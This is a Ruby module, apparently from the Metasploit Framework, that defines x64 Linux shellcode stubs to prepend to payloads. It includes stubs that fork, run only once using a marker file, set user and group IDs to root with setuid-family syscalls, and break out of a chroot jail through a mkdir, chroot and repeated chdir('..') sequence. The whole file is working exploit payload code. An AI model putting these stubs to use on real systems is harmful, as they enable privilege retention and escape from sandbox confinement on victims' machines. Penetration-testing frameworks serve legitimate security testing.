#
# Linux x64 Prepends file
#
module Msf::Payload::Linux::X64::Prepends
  include Msf::Payload::Linux::Prepends
  def prepends_order
    %w[PrependExecOnce PrependFork PrependSetresuid PrependSetreuid PrependSetuid]
  end

  def appends_order
    %w[]
  end

  def prepends_map
    @prepends_map ||= {
      'PrependExecOnce' => prepend_exec_once,
      'PrependFork' => x64_assemble(%(
        push 0x39
        pop rax
        syscall
        test rax, rax
        jz child
      parent:
        xor rdi, rdi
        push 0x3c
        pop rax
        syscall
      child:
        add al, 0x70
        syscall
        push 0x39
        pop rax
        syscall
        test rax, rax
        jnz parent
      )),
      'PrependSetresuid' => x64_assemble(%(
        xor rdi, rdi
        mov rsi, rdi
        push 0x75
        pop rax
        syscall
      )),
      'PrependSetreuid' => x64_assemble(%(
        xor rdi, rdi
        mov rsi, rdi
        mov rdx, rsi
        push 0x71
        pop rax
        syscall
      )),
      'PrependSetuid' => x64_assemble(%(
        xor rdi, rdi
        push 0x69
        pop rax
        syscall
      )),
      'PrependSetresgid' => x64_assemble(%(
        xor rdi, rdi
        mov rsi, rdi
        push 0x77
        pop rax
        syscall
      )),
      'PrependSetregid' => x64_assemble(%(
        xor rdi, rdi
        mov rsi, rdi
        mov rdx, rsi
        push 0x72
        pop rax
        syscall
      )),
      'PrependSetgid' => x64_assemble(%(
        xor rdi, rdi
        push 0x6a
        pop rax
        syscall
      )),
      'PrependChrootBreak' => x64_assemble(%(
        xor rdi, rdi
        mov rsi, rdi
        mov rax, rdi
        mov al, 0x71
        syscall
        mov rdi, 0x#{Rex::Text.rand_text_alpha(8).unpack1('Q<').to_s(16)}
        push rsi
        push rdi
        mov rdi, rsp
        mov si, 0x1ed
        push 0x53
        pop rax
        syscall
        xor rdx, rdx
        mov dl, 0xa1
        mov rax, rdx
        syscall
        mov si, 0x2e2e
        push rsi
        mov rdi, rsp
        push 0x45
        pop rbx
      chdir_loop:
        push 0x50
        pop rax
        syscall
        dec bl
        jnz chdir_loop
        push 0x2e
        mov rdi, rsp
        mov rax, rdx
        syscall
      ))
    }
  end

  def appends_map
    @appends_map ||= {
      'AppendExit' => x64_assemble(%(
        xor rdi, rdi
        push 0x3c
        pop rax
        syscall
      ))
    }
  end

  private

  def prepend_exec_once
    @prepend_exec_once ||= x64_assemble(%(
      jmp marker
    open_marker:
      pop rsi
      mov edi, -100
      mov edx, 0xc1
      mov r10d, 0x180
      mov eax, 257
      syscall
      test eax, eax
      js stop
      mov edi, eax
      mov eax, 3
      syscall
      jmp payload
    stop:
      xor edi, edi
      mov eax, 60
      syscall
    marker:
      call open_marker
      db '#{prepend_exec_once_path}', 0
    payload:
    ))
  end

  def x64_assemble(source)
    Metasm::Shellcode.assemble(Metasm::X64.new, source).encode_string
  end
end
